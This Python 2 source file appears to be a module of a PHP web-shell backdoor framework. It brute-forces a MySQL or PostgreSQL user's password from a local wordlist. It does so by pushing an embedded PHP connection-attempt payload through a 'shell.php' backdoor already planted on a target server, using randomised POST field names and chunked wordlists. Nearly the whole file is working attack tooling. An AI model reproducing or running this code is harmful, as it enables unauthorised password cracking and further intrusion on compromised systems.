'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from random import choice
from math import ceil
from core.parameters import ParametersList, Parameter as P

classname = 'Sql'
 

def chunks(l, n):
    return [l[i:i+n] for i in range(0, len(l), n)]
    
 
class Sql(Module):
    '''Bruteforce sql user
    '''
    
    vectors = VectorList([
            Vector('shell.php', 'brute_sql_php', """$m="%s"; $h="%s"; $u="%s"; $w=$_POST["%s"]; 
ini_set('mysql.connect_timeout',1);
foreach(split('[\n]+',$w) as $pwd) {
$c=@$m("$h", "$u", "$pwd");
if($c){
print("+" . $u . ":" . $pwd . "\n");
break;
}
} 
mysql_close($m);
""")
            ])

    params = ParametersList('Bruteforce single SQL user using local wordlist', vectors,
            P(arg='dbms', help='DBMS', choices=['mysql', 'postgres'], required=True, pos=0),
            P(arg='user', help='SQL user to bruteforce', required=True, pos=1),
            P(arg='lpath', help='Path of local wordlist', required=True, pos=2),
            P(arg='sline', help='Start line of local wordlist', default='all', pos=3),
            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=4))


    def __init__( self, modhandler , url, password):
        
        self.chunksize = 5000
        self.substitutive_wl = []
        Module.__init__(self, modhandler, url, password)
        
        
    def set_substitutive_wl(self, substitutive_wl=[]):
        """Cleaned after use"""
        self.substitutive_wl = substitutive_wl
        
        
    def run_module( self, mode, user, filename, start_line, host):


        
        if start_line == 'all':
            start_line = 0

        if 'localhost' not in host and '127.0.0.1' not in host:
            self.chunksize = 20

        if self.substitutive_wl:
            wl_splitted = self.substitutive_wl[:]
            self.substitutive_wl = []
        else:
            
            try:
                wordlist = open(filename, 'r')
            except Exception, e:
                raise ModuleException(self.name, "%s" % (str(e)))
    
            wl_splitted = [ w.strip() for w in wordlist.read().split() ]
            

        rand_post_name = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])

        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        
        for vector in vectors:
            response = self.__execute_payload(vector, [mode, host, user, rand_post_name, start_line, wl_splitted])
            if response != None:
                self.params.set_and_check_parameters({'vector' : vector.name})
                return response
        
                
        
    def __execute_payload(self, vector, parameters):

        if parameters[0] == 'mysql':
            parameters[0] = "mysql_connect"
        else:
            parameters[0] = "pg_connect"


        rand_post_name = parameters[3]
        start_line = int(parameters[4])
        wl = parameters[5][start_line:]
        wl_length = len(wl)
        
        if wl_length > self.chunksize:
            wl_chunks = chunks(wl, self.chunksize)
            self.mprint('[%s] Splitting wordlist of %i words in %i chunks of %i words.' % (self.name, wl_length, len(wl_chunks), len(wl_chunks[0])))
        else:
            wl_chunks = [ wl ] 
            self.mprint('[%s] Using wordlist of %i words' % (self.name, wl_length))
        
        if self.modhandler.load('shell.php').run({0 : "if(function_exists('%s')) echo(1);" % parameters[0]}) != '1':
            self.mprint('[%s] Skipping vector %s: %s not available' % (self.name, vector.name, parameters[0]))
            return
        
        i=0
        for wl in wl_chunks:
                    
            joined_wl='\n'.join(wl)
        
            payload = self.__prepare_payload(vector, parameters[:-2]) 
            
            self.modhandler.load(vector.interpreter).set_post_data({rand_post_name : joined_wl})
            response = self.modhandler.load(vector.interpreter).run({ 0 : payload})
            
            if response:
                if response.startswith('+'):
                    return "[%s] FOUND! (%s)" % (self.name,response[1:])
            else:
                self.mprint("Tried password #%i: (%s:%s) ..." % (i*len(wl), parameters[2], wl[-1]))

            i+=1

        self.mprint('[%s] Password of \'%s\' not found. Check dbms availability or try with another username and wordlist' % (self.name, parameters[2]));

    def __prepare_payload( self, vector, parameters ):

        if vector.payloads[0].count( '%s' ) == len(parameters):
            return vector.payloads[0] % tuple(parameters)
        else:
            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
        



    
    
    